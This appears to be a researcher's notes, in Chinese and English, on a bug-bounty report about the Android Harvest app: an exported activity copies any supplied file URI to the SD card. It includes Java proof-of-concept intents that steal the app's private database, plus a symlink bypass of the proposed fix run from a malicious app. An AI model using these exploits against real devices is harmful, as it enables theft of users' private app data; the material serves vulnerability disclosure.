# 组件-Harvest 

取回 /data/data/com.harvestapp/* 

com.harvestapp.app.EditExpenseActivity  导出

接受Url 指向 pdf 保存至SD卡

无 check 这个过程

所以可以指定任何Url 至

/sdcard/Android/data/com.harvestapp/files/<current time stamp>.pdf


stealing “ /data/data/com.harvestapp/databases/harvest.db” 的PoC

'''bash
	Intent intent = new Intent("android.intent.action.SEND");
	intent.setClassName("com.harvestapp", "com.harvestapp.app.EditExpenseActivity");
	intent.setType("application/pdf");
	intent.putExtra("android.intent.extra.STREAM", Uri.parse("file:///data/data/com.harvestapp/databases/harvest.db"));
	startActivity(intent);
'''

fix
if (uri.getPathSegments().contains("com.harvestapp")) {

it's bypass

'''
try {
            Runtime.getRuntime().exec("ln -s /data/data/com.harvestapp/databases/harvest.db /data/data/com.pwnharvest/pwn.db").waitFor();
        }
        catch(Exception e) {
            e.printStackTrace();
            finish();
            return;
        }
        new File("/data/data/com.pwnharvest/pwn.db").setReadable(true);
        Intent intent = new Intent("android.intent.action.SEND");
        intent.setClassName("com.harvestapp", "com.harvestapp.app.EditExpenseActivity");
        intent.setType("application/pdf");
        intent.putExtra("android.intent.extra.STREAM", Uri.parse("file:///data/data/com.pwnharvest/pwn.db"));
        startActivity(intent);
'''

where com.pwnharvest is package name of the malware

extra1:
使用android.accounts.AccountManager 可防止account take over

extra2:
通过symlinks进行任意文件读取是一个很有效的手段，
而且不需要root。
symlink到sdcard会有一些问题，但是symlink到 /data/data/pwntarget/目录没有问题
nice report.